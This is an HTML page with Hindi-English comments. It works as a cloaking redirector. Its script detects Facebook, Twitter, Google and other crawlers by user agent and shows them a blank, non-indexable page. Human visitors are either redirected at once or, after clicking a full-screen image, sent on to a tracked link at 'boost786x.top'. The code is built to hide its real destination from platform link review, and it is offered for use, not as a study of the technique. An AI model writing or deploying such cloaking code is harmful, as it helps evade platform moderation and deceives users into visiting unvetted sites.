<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>

  <!-- Facebook / Bots ke liye clean meta -->
  <meta property="og:image" content="">
  <meta property="og:image:width" content="0">
  <meta property="og:image:height" content="0">
  <meta property="og:image:type" content="">
  <meta name="twitter:image" content="">
  <meta name="twitter:card" content="summary">
  <meta name="robots" content="noimageindex, noarchive, nosnippet, nofollow">
  <meta name="googlebot" content="noimageindex, nofollow">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }
    #main-image {
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      cursor: pointer;
      display: none;
    }
    .loading {
      color: #fff;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <img id="main-image" alt="" onclick="goToTarget()">
  <div class="loading" id="loading-text">Loading...</div>

<script>
/* =====================================================
   CONFIG - SIRF YAHAN SE LINKS AUR IMAGE CHANGE KARO
===================================================== */
const CONFIG = {
  // Final destination (dono cases mein same rahega)
  targetLink: "https://boost786x.top/boost55abc/?utm_source=Speedo&utm_medium=AA",

  // Jo image user ko dikhegi (jab image wala case aaye)
  userImage: "images/image_03.webp"
};

/* =====================================================
   ADVANCED BOT / FACEBOOK DETECTION
===================================================== */
function isFacebookOrBot() {
  const ua = navigator.userAgent.toLowerCase();
  const bots = [
    "facebookexternalhit", "facebot", "facebook", "facebookcatalog",
    "meta-externalagent", "meta-externalads", "twitterbot", "linkedinbot",
    "slackbot", "whatsapp", "discordbot", "telegrambot", "googlebot",
    "bingbot", "yandex", "baiduspider", "duckduckbot", "applebot",
    "semrush", "ahrefs", "mj12bot", "dotbot", "petalbot", "bytespider"
  ];
  return bots.some(bot => ua.includes(bot));
}

/* =====================================================
   MAIN LOGIC - 50/50 RANDOM
===================================================== */
(function () {
  // Facebook ya koi bot hai to clean blank page do
  if (isFacebookOrBot()) {
    document.getElementById("loading-text").style.display = "none";
    document.title = "";
    document.body.innerHTML = "";
    return;
  }

  // Real user → 50% chance decide karo
  const showImage = Math.random() < 0.5;   // true = image, false = auto redirect

  if (showImage) {
    // Case 1: Image dikhao + click pe redirect
    const img = document.getElementById("main-image");
    img.src = CONFIG.userImage;
    img.style.display = "block";
    document.getElementById("loading-text").style.display = "none";
  } else {
    // Case 2: 0 second auto redirect
    document.getElementById("loading-text").style.display = "none";
    window.location.replace(CONFIG.targetLink);
  }
})();

// Image pe click
function goToTarget() {
  window.location.href = CONFIG.targetLink;
}
</script>

</body>
</html>
